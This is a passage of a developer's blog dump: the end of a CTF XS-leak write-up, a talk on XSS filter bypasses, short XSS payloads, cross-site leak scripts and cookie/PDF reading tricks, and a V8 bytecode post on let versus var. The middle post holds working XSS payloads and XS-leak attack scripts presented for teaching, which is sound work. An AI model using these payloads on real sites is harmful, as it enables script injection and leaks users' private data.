leak charset let charset = 'abcdefghijklmnopqrstuvwxyz_&#125;'.split('') let newCharset = '' for(let char of charset) &#123; let time = 0 for(let i=0; i&lt;3; i++) &#123; time += await leak(char) &#125; time/=3 send('char:' + char + ',time:' + time) if (time >= thershold) &#123; newCharset += char send(newCharset) &#125; &#125; I spent most of the time tweaking these details to get the expected result. Anyway, by running the exploit a few times, we can get the flag in the end: justCTF&#123;timeme__&#125;(IIRC, the server is off, and I forgot to take the screenshot)","link":"/2022/06/14/en/justctf-2022-xsleak-writeup/"},{"title":"Discovering My Lack of Front-end Knowledge through Cybersecurity","text":"This article is the text version of my presentation “Discovering the Depth of Front-end through Cybersecurity” at Modern Web 2021. The video of the talk is not yet available, but if you want to see the slides, you can find them here: slides I personally think that the combination of video and slides would be better than text alone, but I thought it would be nice to have a written record, so I wrote this article. The content may differ slightly from the video, as it’s like rewriting it. I Didn’t Know Front-endThis title is my most genuine thought after entering the world of cybersecurity. As a front-end engineer, I thought I was quite familiar with front-end development. I have used or heard of native JavaScript, as well as some frameworks or libraries. I wasn’t too surprised when I saw many strange JavaScript questions, and I thought there was nothing that could make me say “Wow!”. It wasn’t until I came into contact with cybersecurity-related things that I realized how naive I was. The front-end that front-end engineers encounter is different from the front-end that cybersecurity engineers see. The focus of cybersecurity is on various attack methods, finding ways to bypass existing restrictions and finding a new path. But front-end engineers don’t need to know those things because they write code in an unrestricted environment. Recently, I played some CTF and looked at front-end from another perspective. I learned a lot of new front-end knowledge. In other words, I re-learned the knowledge of my familiar field (front-end) in a new field (cybersecurity). This feeling is very special, so I want to share with you some of the things I learned in this article, hoping to make you feel the same surprise I felt at the beginning. This article is divided into three main topics: Bypassing various restrictions XS leaks Other features you may not know A simplest and most intuitive XSS payload would look like this: &lt;script>alert(1)&lt;/script> However, this form of XSS is not interesting enough and is easily defendable, so let’s not talk about it for now and look at some more interesting ones, such as this: &lt;img src=non_exist onerror=alert(1)> This HTML uses event handlers to execute JavaScript. We load a non-existent image, which triggers the onerror event and executes the code inside. It is also worth noting that the attribute does not need to be enclosed in &quot;&quot;. We can go further and make it look like this: &lt;svg onload=alert(1)> This time, we don’t even need a src, we just use &lt;svg&gt; with the onload event to execute the code. Suppose Xiaoming is a backend engineer responsible for filtering these input strings to prevent XSS vulnerabilities. In addition to filtering &lt;script&gt;, Xiaoming also filters spaces. The reason is simple: for XSS that uses attributes to execute, there must be a space between the attribute and the tag, right? Once the spaces are filtered out, it is impossible to use attributes for XSS, right? Naive Xiaoming hit a wall because it can be done like this: &lt;svg/onload=alert(1)> &lt;svg onload=alert(1)> &lt;svg onload=alert(1)> In addition to spaces, /, tabs, and line breaks are all valid separators, so replacing only spaces is useless. After Xiaoming learned this rule, he realized that the real problem was not spaces, but event handlers starting with onxxx. So he filtered out all attributes starting with on, thinking, “If there is no event handler, there is no XSS, right?” It sounds very reasonable, but what he didn’t know was that even without event handlers, it can still be done like this: &lt;iframe/src=\"javascript:alert(1)\"> The string starting with javascript: is called a JavaScript pseudo protocol, which can be used in some places to execute code. We mentioned this feature in our previous post, “Open Redirect: What to Watch Out for When Implementing Redirect Functionality.” Little Ming’s defense failed again, so he had to strengthen it again. He replaced the seemingly dangerous string javascript with something else. Shouldn’t that be enough to fix it? Little did he know that inserting a tab between the letters of javascript still worked: &lt;iframe/src=\"javas cript:alert(1)\"> Little Ming fixed the code by replacing all the unnecessary things like spaces, blank lines, or tabs with empty strings, and then checked again for javascript. If it was found, it was filtered out. This way, the payload above would not work. But Little Ming forgot that information on web pages can be encoded. For example, if you want to display &lt;h1&gt; on the screen, you need to encode it as &amp;lt;h1&amp;gt;. This way, the screen displays what you want, rather than interpreting it as an h1 tag. In addition to those special symbols, regular text can also be encoded using &amp;#&#123;ascii_code&#125;;. For example, the ascii code for j is 106, so it can be encoded as &amp;#106;: &lt;iframe/src=\"&amp;#106;avascript:alert(1)\"> If you want, you can encode the entire string, leaving only some symbols and numbers. Annoyed Little Ming gave up and disabled the src attribute, thinking, “If I disable src, everything will be fine, right? Don’t bother me anymore!” But he forgot that &lt;a&gt; can also use this attribute: &lt;a/href=\"&amp;#106;avascript:alert(1)\">Click me&lt;/a> This time, it won’t trigger automatically. The user needs to click it to trigger it. Finally, Little Ming couldn’t take it anymore, so he covered it with DOMPurify and ended this round. In addition to these tag and attribute bypasses, JavaScript itself is also quite interesting to bypass. For example, “Is there a way to execute a function without using ()?” If you’ve used React’s styled-components or something similar, you’ve probably written code like this: const Box = styled.div` background: red; ` Why does this generate a component? This is because backticks can be used not only as template strings, but also as function calls. I mentioned this in Intigriti’s 0521 XSS Challenge Solution: Limited Character Combination Code. So you can write it like this: alert`1` But what if you can’t even use backticks now? Is there any other way? There is a method that I admired for a long time when I first saw it: onerror=alert;throw 1 It rewrites window.onerror to alert, and then throws an error. This error is caught by window.onerror because it is not caught, and finally executed in the alert. In addition to alert, any code can be executed by rewriting it: onerror=eval; throw \"=alert\\x281\\x29\" The first line is the same as before, except that this time onerror is changed to eval. But what is the second line doing? Let’s talk about the encoding of () first, which are \\x28 and \\x29, respectively. But why is there an = in front? This is because when the error is thrown, if it is Chrome, the string it finally generates is: Uncaught &#123;err_message&#125;, such as throw 1, which will generate Uncaught 1. But this is not a JavaScript code, and it will directly throw an error when thrown into eval. So we throw &quot;=alert\\x281\\x29&quot;, which becomes Uncaught=alert\\x281\\x29, and the whole sentence becomes an expression. Uncaught is treated as an undeclared global variable, and its value is the return value of alert(1). In this way, the entire error message becomes legal JavaScript code! Using this method to throw to eval, it can be executed normally. In fact, there are some more amazing methods, but the space is limited and some of them I am still trying to understand, so let’s stop here. The following figure summarizes: Word LimitIn addition to the above attribute and character restrictions, there is another restriction called word limit. For example, if a website’s nickname has an XSS vulnerability, but can only enter up to 25 characters, in this case, only popping up an alert is not powerful. Can you execute any code? The shortest XSS payload &lt;svg/onload=&gt; already has 13 characters, leaving us with only 12 characters to execute the code. At this point, we need to use a technique called “using existing information,” like this: // 13 + 18 = 31 characters &lt;svg/onload=eval(`'`+location)> This short code hides a lot of details. First of all, if you want to get the URL, how would you do it? location.href? A shorter way is to convert location to a string, and you can still get the URL. But the URL itself is not valid code, so we need to add a single quote in front of it, and then use the # on the URL, like this: https://example.com#&#39;;alert(1). Concatenate it with a single quote, and it becomes: 'https://example.com#';alert(1) This is a valid JavaScript code because it becomes a string followed by a command! In addition to location, document.URL can also get the URL, but it has more characters than location. However, did you know that document can be omitted, like this: // 13 + 13 = 26 characters &lt;svg/onload=eval(`'`+URL)> Why don’t we need to write document? This is because there is a hidden specification. In the inline code of the event handler, the default scope will have document: It is also obvious when viewed with a debugger. Therefore, even if we only enter URL, we can still find document.URL due to the scope and the relationship with with. We are only one character away from being under 25 characters. Are there any other tricks? Yes, please take a look at the code below. What do you expect the output to be? name = 123 console.log(typeof name === 'number') It should be true, right? 123 is a number, which is very reasonable! But if you actually run it on a browser, you will find that the output is false because typeof name is a string! This is because name is a special attribute that represents the name of the window or, simply put, the name of the page. In other words, even if the content is different, the same page will still share the same name! Suppose the website I want to attack is example.com and my website is huli.tw. I can write it like this on my website: &lt;script> name = 'alert(1)' window.location = 'http://example.com' &lt;/script> After setting the name, jump to the target website and then enter this payload: // 13 + 10 = 23 characters &lt;svg/onload=eval(name)> Because of the sharing of name, I can successfully execute the code I want. This time, it only takes 23 characters, successfully compressed within 25 characters. There is a website called Tiny XSS Payloades, which specializes in collecting these short payloads. There are more strange payloads inside. If necessary, you can refer to them. The payloads I know are also from this website. XS leaksAfter talking about some bypasses of restrictions, let’s take a look at another topic called Cross-Site Leaks (abbreviated as XS Leaks). This attack is actually a side-channel attack on the webpage. Regarding side-channel attacks, I mentioned it before in CORS Complete Manual (5): Security Issues of Cross-Origin, using the well-known Spectre as an example. What is a side-channel attack? It means that you indirectly obtain information through some methods. For example, suppose you have a light bulb in front of you, but you can’t see it at all, and you can’t even feel the light source. How do you know if the light bulb is on or off? One way is through “temperature”, because if the light bulb is on, it will emit light and may generate heat (assuming this premise is true and ignoring some edge cases, just for example). Therefore, when you touch the light bulb, you can feel the heat, which indirectly tells you whether the light bulb is on or off. If we apply this concept to a webpage, it is similar. We can indirectly obtain information on the webpage through some methods. Let’s look at two examples. Search and DownloadSuppose there is a website with a search and download function, and you can directly enter the string you want to search in the query string, for example, https://example.com/download?q=example. If there is no matching data in the database, a “No user found” page will appear: On the other hand, if there is data, the native file download window will pop up directly, allowing you to download the corresponding file: As an attacker, what can we do with this information? Suppose I have my own website with the URL https://huli.tw, and then I embed the example website just now using an iframe on my website: const iframe = document.createElement('iframe') iframe.src = \"https://example.com/download?q=user01\" document.body.appendChild(iframe) At this critical moment, if the data of user01 does not exist in the database, an error will occur when I try to access iframe.contentWindow.origin. This is because huli.tw and example.com are not the same origin websites, so they are blocked by the browser’s Same-Origin Policy. But! If the data of user01 exists in the database, won’t the download screen pop up directly? At this time, if I try to access iframe.contentWindow.origin, there will be no error because I will get the result of null. Therefore, based on the result of accessing iframe.contentWindow.origin, we can know whether a certain keyword exists in the database: const iframe = document.createElement('iframe') iframe.src = \"https://example.com/download?q=user01\" document.body.appendChild(iframe) // 先假設一秒後會載入完畢，可以做到更精確但先跳過 setTimeout(() => &#123; try &#123; iframe.contentWindow.origin console.log('使用者存在') &#125; catch(err) &#123; console.log('使用者不存在') &#125; &#125;, 1000) This is XS leaks. We are clearly on website A, but we can use some techniques to obtain information from website B. The complete attack implementation will extend the above attack script, for example, testing a first and then testing b, and so on. If b is found to exist, then repeat the above process to test ba, bb, etc., in this way, at least one set of user accounts can be leaked. Then, just send the link of this webpage to someone who has permission to access the https://example.com/download page and is logged in, and the attack will be launched when they click on it. Although the pre-steps may sound a bit complicated, it is indeed a feasible attack method. The mystery of idSuppose there is a social networking site that boasts extremely high privacy. You cannot see who your friends’ friends are, cannot see mutual friends, so you don’t know who is friends with whom, only know who your friends are. You and David, whose user id is 123, are good friends, so when you click on his profile page: http://example.com/users/123, you will see a “Send Message” button, and the id of the button is message: And you and Peter, whose user id is 210, are not friends, so when you click on his page, you will see another button called “Add Friend”, and the id is add: This sounds reasonable, and the implementation of elements with id on the webpage is perfectly reasonable. However, this also poses a risk of XS leaks. The browser has a user-friendly feature that you may or may not have noticed. When you add #id to the end of a URL, the browser automatically jumps to the paragraph with that id and focuses on the element (if it can be focused). The anchor function of the article relies on this to jump to a specific paragraph. Therefore, when I connect to http://example.com/users/123#message, if I am friends with the person with id 123, the “Send Message” button will appear on the page, and the browser will jump to the button and focus on it. What if I am not friends with 123? Then nothing will happen. So we can use this difference to know whether the person with id 123 is a friend of the current user. The method is similar to the search and download just now. We need to embed the target webpage in an iframe. If this id exists, the iframe will focus, and the original body will blur: window.onblur = () => &#123; console.log('是好友') &#125; const iframe = document.createElement('iframe') iframe.src = 'https://example.com/users/123#message' document.body.appendChild(iframe) Then send this webpage to someone who wants to know their friend status. When they open the webpage, you can know whether they are good friends with 123. If the id of this website is a serial number, you can traverse each id and find out who is in their friend list. The above are two examples of XS leaks, both achieved through some browser or JS features. If you are interested in these, you can refer to: XS-Leaks Wiki, where there are more interesting cases (these I know are also from this website). If you want to see actual examples of XS leaks, there are many here: Mass XS-Search using Cache Attack, and this recent one is also interesting: Abusing Slack’s file-sharing functionality to de-anonymise fellow workspace members Other Features You Might Not KnowIn the last paragraph, I want to share some “you might not know” features, or more precisely, features that surprised me when I found out about them. I never thought they could be done. Reading Cookies from Different PathsWhen setting cookies, there are many parameters that can be set, one of which is called path. For example, if I set the cookie’s path to /siteA, then when I’m on /siteB, I can’t read the cookie from /siteA because the paths are different, so I can’t get it. But actually, it’s not necessarily true. If your website doesn’t block iframe embedding and the cookie isn’t set to HttpOnly, you can use an iframe to read cookies from different paths: // 假設我們在 https://example.com/siteA const iframe = document.createElement('iframe') iframe.src = 'https://example.com/siteB' iframe.onload = () => alert(iframe.contentWindow.document.cookie) &#125; document.body.appendChild(iframe) This is because https://example.com/siteA and https://example.com/siteB are the same origin even though their paths are different. Therefore, you can directly access the document of other same-origin web pages through an iframe and use this feature to get document.cookie. If iframe is not supported, window.open can achieve the same effect: const win = window.open('//example.com/siteB') setTimeout(() => &#123; alert(win.document.cookie) &#125;, 1000) However, it should be noted that window.open is blocked by default and requires user permission to open, or the user needs to perform an action to execute it (such as putting the above code in a button onclick). Later, I found that section 8.5: Weak Confidentiality of RFC 6265 also mentioned this (strange, I didn’t notice it when I read it before): Cookies do not always provide isolation by path. Although the network-level protocol does not send cookies stored for one path to another, some user agents expose cookies via non-HTTP APIs, such as HTML’s document.cookie API. Because some of these user agents (e.g., web browsers) do not isolate resources received from different paths, a resource retrieved from one path might be able to access cookies stored for another path. Reading PDF ContentSuppose your website embeds a same-origin PDF file, like this: &lt;embed src=\"/test.pdf\"> How do you use JS to read the content inside this PDF? The answer must be fetch or xhr: fetch(\"/test.pdf\") .then(res => res.blob()) .then(res => &#123; console.log('pdf', res) &#125;) But what if fetch doesn’t work? For example, the server blocks requests from fetch on the backend (using Fetch Metadata). What should you do then? Is there any way to read the content of the PDF? I used to think it was impossible until I learned about a hidden Chrome API: /** @override */ handleScriptingMessage(message) &#123; if (super.handleScriptingMessage(message)) &#123; return true; &#125; if (this.delayScriptingMessage(message)) &#123; return true; &#125; switch (message.data.type.toString()) &#123; case 'getSelectedText': this.pluginController_.getSelectedText().then( this.handleSelectedTextReply.bind(this)); break; case 'getThumbnail': const getThumbnailData = /** @type &#123;GetThumbnailMessageData&#125; */ (message.data); const page = getThumbnailData.page; this.pluginController_.requestThumbnail(page).then( this.sendScriptingMessage.bind(this)); break; case 'print': this.pluginController_.print(); break; case 'selectAll': this.pluginController_.selectAll(); break; default: return false; &#125; return true; &#125; From this code, you can see two commands, selectAll and getSelectedText. The former can select all the content of the PDF, and the latter can get the selected text. Therefore, by combining these two, you can get the text content inside the PDF: // HTML: &lt;embed id=\"f\" onload=\"loaded()\" src=\"...\"> window.addEventListener('message', e => &#123; if (e.data.type === 'getSelectedTextReply') &#123; alert(e.data.selectedText) &#125; &#125;) function loaded() &#123; f.postMessage(&#123;type:'selectAll'&#125;, '*') f.postMessage(&#123;type:'getSelectedText'&#125;, '*') &#125; A simple demo webpage: https://aszx87410.github.io/demo/mw2021/05-pdf/index.html Although this trick can only be used on text, this hidden feature is really exciting. ConclusionTo supplement, some of the above attacks may not be applicable to all environments. For example, some attacks require that the website does not block iframes, and cookies used for authentication may not be set to SameSite, otherwise they will be invalid. The method of using name to pass payload may not be applicable in some browsers, but I think this does not affect the interestingness of these attacks. Some of the bypass techniques mentioned in the article are not written in detail because my focus is on “finding at least one bypass method” rather than “writing all bypass methods”. For more complete bypass techniques, you can refer to: Cheatsheet: XSS that works in 2021. Many of the techniques mentioned in this article are what I learned through playing CTF, such as XS leaks for downloading files from LINE CTF 2021 - Your Note, reading cookies from different paths from DiceCTF 2021 - Web IDE, and Chrome’s hidden API from zer0pts CTF 2021 - PDF Generator. Through CTF, I saw a different side of the web. These are some of the front-end related knowledge I have learned recently, each of which has exceeded my imagination. I hope this article can make you feel the same surprise I felt at the beginning and think, “Wow, there are still so many things in front-end that I don’t know.”","link":"/2021/10/25/en/learn-frontend-from-security-pov/"},{"title":"Exploring the Performance Issues of let and var from V8 bytecode","text":"IntroductionIn two of my previous articles, I Know You Understand Hoisting, But Do You Really Understand It? and All Functions Are Closures: Discussing Scope and Closure in JS, I talked about the differences between the scopes of let and var. The scope of let is block, while var is function. This is a classic example: for(var i=1; i&lt;=10; i++) &#123; setTimeout(function() &#123; console.log(i) &#125;) &#125; It was originally expected to output 1 to 10 in order, but unexpectedly output 10 11s. The reason behind this is that the i on the third line always has only one, which is the var i declared in the for loop, and it is the same variable from beginning to end. The classic solution is also very simple, just change var to let: for(let i=1; i&lt;=10; i++) &#123; setTimeout(function() &#123; console.log(i) &#125;) &#125; The reason why this works is that the above code can be seen as the following form: &#123; let i=1 setTimeout(function() &#123; console.log(i) &#125;) &#125; &#123; let i=2 setTimeout(function() &#123; console.log(i) &#125;) &#125; ... &#123; let i=10 setTimeout(function() &#123; console.log(i) &#125;) &#125; Since the scope of let is block, there is actually a new i in each round of the loop, so there are 10 different i after the loop runs 10 times, and of course, 10 different numbers are output in the end. Therefore, the biggest difference between var and let in this example is the number of variables, the former has only one, while the latter has 10. Okay, now that you know the difference between let and var, let’s take a look at the main issue of this article. In fact, this issue comes from a question raised by @getify, the author of YDKJS (You Don’t Know JS), on his Twitter: question for JS engines devs…is there an optimization in place for this kind of code? for (let i = 0; i &lt; 10; i++) &#123; // no closure &#125; IOW, where the behavior of creating a new i per iteration is not needed nor observable… does JS skip doing it? If you didn’t understand it very well, you can continue to read the other tweet: here’s a variation on the question… will JS engines exhibit much performance difference between these two loops? for (var i = 0; i &lt; 100000000; i++) &#123; // do some stuff, but not closure &#125; for (let i = 0; i &lt; 100000000; i++) &#123; // do the same stuff (no closure) &#125; Simply put, when we usually use let with loops, isn’t it like we said above, there will be a new i in each round? If so, then there should be a performance difference between var and let, because let must new a new variable in each round, so let will be slower. If the loop does not need a new i in each round, will the JS engine optimize it? This issue is mainly to explore whether the JS engine will optimize this behavior. So how do we know? Either you are a JS engine developer, or you can look at the JS bytecode, but both of these difficulties are a bit too high. But don’t worry, there is a third way: look at the JS bytecode. JavaScript BytecodeIf you don’t know what bytecode is, you can refer to this classic article: Understanding V8’s Bytecode, Chinese version: Understanding V8’s Bytecode. Let’s start with the clearest picture explained in the article: When executing JavaScript, V8 first compiles the code into bytecode, then compiles the bytecode into machine code, and finally executes it. Let’s take an example from real life. If you want to translate an English article into Classical Chinese, you usually translate the English article into vernacular Chinese first, and then translate it into Classical Chinese from vernacular Chinese. Because it is too difficult to translate directly from English to Classical Chinese, it is easier to translate it into vernacular Chinese first; at the same time, some optimizations can be made when translating into vernacular Chinese, which will make it easier to translate into Classical Chinese. In this metaphor, plain text is the protagonist of our article: bytecode. When writing C&#x2F;C++, if you want to know whether the compiler will optimize a certain piece of code, the most direct way is to output the compiled assembly code. By reverse-engineering the assembly language, you can know whether the compiler has done anything. Bytecode is the same. You can reverse-engineer the generated bytecode to see if V8 has done anything. So how do you view the bytecode generated by V8? The easiest way is to use the Node.js command: node --print-bytecode a.js, just add the --print-bytecode flag. But if you try it, you will find that a lot of things are output, which is normal. Because there are a lot of built-in things besides the code you wrote, we can use --print-bytecode-filter to filter the function names. var and let: Round 1The test code I prepared is as follows: function find_me_let_for()&#123; for (let i = 0; i &lt; 10; i++) &#123; console.log(i) &#125; &#125; function find_me_var_for() &#123; for (var i = 0; i &lt; 10; i++) &#123; console.log(i) &#125; &#125; find_me_let_for() find_me_var_for() Then you can use the command: node --print-bytecode --print-bytecode-filter=&quot;find_me*&quot; a.js &gt; byte_code.txt, and save the result to byte_code.txt. The content is as follows: [generated bytecode for function: find_me_let_for] Parameter count 1 Frame size 24 86 E&gt; 0x77191b56622 @ 0 : a0 StackCheck 105 S&gt; 0x77191b56623 @ 1 : 0b LdaZero 0x77191b56624 @ 2 : 26 fb Star r0 110 S&gt; 0x77191b56626 @ 4 : 0c 0a LdaSmi [10] 110 E&gt; 0x77191b56628 @ 6 : 66 fb 00 TestLessThan r0, [0] 0x77191b5662b @ 9 : 94 1c JumpIfFalse [28] (0x77191b56647 @ 37) 92 E&gt; 0x77191b5662d @ 11 : a0 StackCheck 127 S&gt; 0x77191b5662e @ 12 : 13 00 01 LdaGlobal [0], [1] 0x77191b56631 @ 15 : 26 f9 Star r2 135 E&gt; 0x77191b56633 @ 17 : 28 f9 01 03 LdaNamedProperty r2, [1], [3] 0x77191b56637 @ 21 : 26 fa Star r1 135 E&gt; 0x77191b56639 @ 23 : 57 fa f9 fb 05 CallProperty1 r1, r2, r0, [5] 117 S&gt; 0x77191b5663e @ 28 : 25 fb Ldar r0 0x77191b56640 @ 30 : 4a 07 Inc [7] 0x77191b56642 @ 32 : 26 fb Star r0 0x77191b56644 @ 34 : 85 1e 00 JumpLoop [30], [0] (0x77191b56626 @ 4) 0x77191b56647 @ 37 : 0d LdaUndefined 146 S&gt; 0x77191b56648 @ 38 : a4 Return Constant pool (size &#x3D; 2) Handler Table (size &#x3D; 0) 0 1 2 3 4 5 6 7 8 9 [generated bytecode for function: find_me_var_for] Parameter count 1 Frame size 24 173 E&gt; 0x77191b60d0a @ 0 : a0 StackCheck 193 S&gt; 0x77191b60d0b @ 1 : 0b LdaZero 0x77191b60d0c @ 2 : 26 fb Star r0 198 S&gt; 0x77191b60d0e @ 4 : 0c 0a LdaSmi [10] 198 E&gt; 0x77191b60d10 @ 6 : 66 fb 00 TestLessThan r0, [0] 0x77191b60d13 @ 9 : 94 1c JumpIfFalse [28] (0x77191b60d2f @ 37) 180 E&gt; 0x77191b60d15 @ 11 : a0 StackCheck 215 S&gt; 0x77191b60d16 @ 12 : 13 00 01 LdaGlobal [0], [1] 0x77191b60d19 @ 15 : 26 f9 Star r2 223 E&gt; 0x77191b60d1b @ 17 : 28 f9 01 03 LdaNamedProperty r2, [1], [3] 0x77191b60d1f @ 21 : 26 fa Star r1 223 E&gt; 0x77191b60d21 @ 23 : 57 fa f9 fb 05 CallProperty1 r1, r2, r0, [5] 205 S&gt; 0x77191b60d26 @ 28 : 25 fb Ldar r0 0x77191b60d28 @ 30 : 4a 07 Inc [7] 0x77191b60d2a @ 32 : 26 fb Star r0 0x77191b60d2c @ 34 : 85 1e 00 JumpLoop [30], [0] (0x77191b60d0e @ 4) 0x77191b60d2f @ 37 : 0d LdaUndefined 234 S&gt; 0x77191b60d30 @ 38 : a4 Return Constant pool (size &#x3D; 2) Handler Table (size &#x3D; 0) 0 1 2 3 4 5 6 7 8 9 The first line indicates which function it is, which is convenient for us to identify: [generated bytecode for function: find_me_let_for], followed by the actual bytecode. Before looking at the bytecode, it is very important to have a preparatory knowledge that there is a temporary register called the accumulator in the environment where the bytecode is executed. If there is the letter a in the instruction, it is the abbreviation of the accumulator (hereinafter referred to as acc). For example, the second and third lines of the bytecode: LdaZero and Star r0, the former is: LoaD Accumulator Zero, which sets the acc register to 0, and the next line Star r0 is Store Accumulator to register r0, which is r0=acc, so r0 will become 0. I translated the above find_me_let_for into plain text: StackCheck &#x2F;&#x2F; 檢查 stack LdaZero &#x2F;&#x2F; acc &#x3D; 0 Star r0 &#x2F;&#x2F; r0 &#x3D; acc LdaSmi [10] &#x2F;&#x2F; acc &#x3D; 10 TestLessThan r0, [0] &#x2F;&#x2F; test if r0 &lt; 10 JumpIfFalse [28] &#x2F;&#x2F; if false, jump to line 17 StackCheck &#x2F;&#x2F; 檢查 stack LdaGlobal [0], [1] &#x2F;&#x2F; acc &#x3D; console Star r2 &#x2F;&#x2F; r2 &#x3D; acc LdaNamedProperty r2, [1], [3] &#x2F;&#x2F; acc &#x3D; r2.log Star r1 &#x2F;&#x2F; r1 &#x3D; acc (也就是 console.log) CallProperty1 r1, r2, r0, [5] &#x2F;&#x2F; console.log(r0) Ldar r0 &#x2F;&#x2F; acc &#x3D; r0 Inc [7] &#x2F;&#x2F; acc++ Star r0 &#x2F;&#x2F; r0 &#x3D; acc JumpLoop [30], [0] &#x2F;&#x2F; 跳到 line 4 LdaUndefined &#x2F;&#x2F; acc &#x3D; undefined Return &#x2F;&#x2F; return acc If you are not used to this form, it may be because you have not seen assembly language (in fact, assembly language is much more difficult than this…), and you will get used to it after reading it a few more times. Anyway, the above code is a loop that will log r0 continuously until r0&gt;&#x3D;10. This r0 is the i in our code. If you look closely, you will find that the bytecode generated by let and var versions is exactly the same, and there is only one variable r0 from beginning to end. Therefore, it can be inferred that V8 does optimize this situation and does not really create a new i for each loop. When using let, there is no need to worry about performance differences with var. var and let: Round 2Next, we can try the case where “a new i must be created for each loop”, that is, when there is a closure inside that needs to access i. The sample code prepared here is as follows: function find_me_let_timeout() &#123; for (let i = 0; i &lt; 10; i++) &#123; setTimeout(function find_me_let_timeout_inner() &#123; console.log(i) &#125;) &#125; &#125; function find_me_var_timeout() &#123; for (var i = 0; i &lt; 10; i++) &#123; setTimeout(function find_me_var_timeout_inner() &#123; console.log(i) &#125;) &#125; &#125; find_me_let_timeout() find_me_var_timeout() Using the same command as before, you can see the generated bytecode. Let’s first see if there is any difference between the two inner functions: [generated bytecode for function: find_me_let_timeout_inner] Parameter count 1 Frame size 24 177 E&gt; 0x25d2f37dbb2a @ 0 : a0 StackCheck 188 S&gt; 0x25d2f37dbb2b @ 1 : 13 00 00 LdaGlobal [0], [0] 0x25d2f37dbb2e @ 4 : 26 fa Star r1 196 E&gt; 0x25d2f37dbb30 @ 6 : 28 fa 01 02 LdaNamedProperty r1, [1], [2] 0x25d2f37dbb34 @ 10 : 26 fb Star r0 0x25d2f37dbb36 @ 12 : 1a 04 LdaCurrentContextSlot [4] 200 E&gt; 0x25d2f37dbb38 @ 14 : a5 02 ThrowReferenceErrorIfHole [2] 0x25d2f37dbb3a @ 16 : 26 f9 Star r2 196 E&gt; 0x25d2f37dbb3c @ 18 : 57 fb fa f9 04 CallProperty1 r0, r1, r2, [4] 0x25d2f37dbb41 @ 23 : 0d LdaUndefined 207 S&gt; 0x25d2f37dbb42 @ 24 : a4 Return Constant pool (size &#x3D; 3) Handler Table (size &#x3D; 0) [generated bytecode for function: find_me_var_timeout_inner] Parameter count 1 Frame size 24 332 E&gt; 0x25d2f37e6cf2 @ 0 : a0 StackCheck 343 S&gt; 0x25d2f37e6cf3 @ 1 : 13 00 00 LdaGlobal [0], [0] 0x25d2f37e6cf6 @ 4 : 26 fa Star r1 351 E&gt; 0x25d2f37e6cf8 @ 6 : 28 fa 01 02 LdaNamedProperty r1, [1], [2] 0x25d2f37e6cfc @ 10 : 26 fb Star r0 0x25d2f37e6cfe @ 12 : 1a 04 LdaCurrentContextSlot [4] 0x25d2f37e6d00 @ 14 : 26 f9 Star r2 351 E&gt; 0x25d2f37e6d02 @ 16 : 57 fb fa f9 04 CallProperty1 r0, r1, r2, [4] 0x25d2f37e6d07 @ 21 : 0d LdaUndefined 362 S&gt; 0x25d2f37e6d08 @ 22 : a4 Return Constant pool (size &#x3D; 2) Handler Table (size &#x3D; 0) You can see that the only difference is that the let version has an additional ThrowReferenceErrorIfHole, which has been mentioned in I know you understand hoisting, but how deep do you understand?. It is actually the implementation of TDZ (Temporal Dead Zone) on V8. Finally, let’s look at the main course, starting with var: [generated bytecode for function: find_me_var_timeout] Parameter count 1 Frame size 24 0x25d2f37d8d22 @ 0 : 7f 00 01 CreateFunctionContext [0], [1] 0x25d2f37d8d25 @ 3 : 16 fb PushContext r0 245 E&gt; 0x25d2f37d8d27 @ 5 : a0 StackCheck 265 S&gt; 0x25d2f37d8d28 @ 6 : 0b LdaZero 265 E&gt; 0x25d2f37d8d29 @ 7 : 1d 04 StaCurrentContextSlot [4] 270 S&gt; 0x25d2f37d8d2b @ 9 : 1a 04 LdaCurrentContextSlot [4] 0x25d2f37d8d2d @ 11 : 26 fa Star r1 0x25d2f37d8d2f @ 13 : 0c 0a LdaSmi [10] 270 E&gt; 0x25d2f37d8d31 @ 15 : 66 fa 00 TestLessThan r1, [0] 0x25d2f37d8d34 @ 18 : 94 1b JumpIfFalse [27] (0x25d2f37d8d4f @ 45) 252 E&gt; 0x25d2f37d8d36 @ 20 : a0 StackCheck 287 S&gt; 0x25d2f37d8d37 @ 21 : 13 01 01 LdaGlobal [1], [1] 0x25d2f37d8d3a @ 24 : 26 fa Star r1 0x25d2f37d8d3c @ 26 : 7c 02 03 02 CreateClosure [2], [3], #2 0x25d2f37d8d40 @ 30 : 26 f9 Star r2 287 E&gt; 0x25d2f37d8d42 @ 32 : 5b fa f9 04 CallUndefinedReceiver1 r1, r2, [4] 277 S&gt; 0x25d2f37d8d46 @ 36 : 1a 04 LdaCurrentContextSlot [4] 0x25d2f37d8d48 @ 38 : 4a 06 Inc [6] 277 E&gt; 0x25d2f37d8d4a @ 40 : 1d 04 StaCurrentContextSlot [4] 0x25d2f37d8d4c @ 42 : 85 21 00 JumpLoop [33], [0] (0x25d2f37d8d2b @ 9) 0x25d2f37d8d4f @ 45 : 0d LdaUndefined 369 S&gt; 0x25d2f37d8d50 @ 46 : a4 Return Constant pool (size &#x3D; 3) Handler Table (size &#x3D; 0) At the beginning, CreateFunctionContext creates a function context, and then you can see that the way of accessing variables is different from simply using temporary registers. Here, StaCurrentContextSlot and LdaCurrentContextSlot are used. If you encounter instructions that you don’t understand, you can check the definition in &#x2F;src&#x2F;interpreter&#x2F;interpreter-generator.cc. // StaCurrentContextSlot &lt;slot_index> // // Stores the object in the accumulator into |slot_index| of the current // context. IGNITION_HANDLER(StaCurrentContextSlot, InterpreterAssembler) &#123; Node* value = GetAccumulator(); Node* slot_index = BytecodeOperandIdx(0); Node* slot_context = GetContext(); StoreContextElement(slot_context, slot_index, value); Dispatch(); &#125; // LdaCurrentContextSlot &lt;slot_index> // // Load the object in |slot_index| of the current context into the accumulator. IGNITION_HANDLER(LdaCurrentContextSlot, InterpreterAssembler) &#123; Node* slot_index = BytecodeOperandIdx(0); Node* slot_context = GetContext(); Node* result = LoadContextElement(slot_context, slot_index); SetAccumulator(result); Dispatch(); &#125; In short, StaCurrentContextSlot stores the contents of acc in a certain slot_index of the current context, while LdaCurrentContextSlot does the opposite, taking the contents out and putting them in acc. So let’s take a look at the first few lines: LdaZero StaCurrentContextSlot [4] LdaCurrentContextSlot [4] Star r1 LdaSmi [10] TestLessThan r1, [0] JumpIfFalse [27] (0x25d2f37d8d4f @ 45) This puts 0 into slot_index 4 of the current context, then puts it into r1, and then compares it to 10. This part is actually the i&lt;10 in the for loop. The second half: LdaCurrentContextSlot [4] Inc [6] StaCurrentContextSlot [4] Is actually i++. So i will exist in the slot_index 4 of the current context. Now let’s take a look at the inner function mentioned earlier: [generated bytecode for function: 